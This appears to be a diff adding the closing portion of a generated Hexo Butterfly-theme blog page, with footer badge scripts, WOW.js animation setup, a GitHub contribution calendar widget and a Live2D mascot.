+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="/js/ali_font.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
+    }
+  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
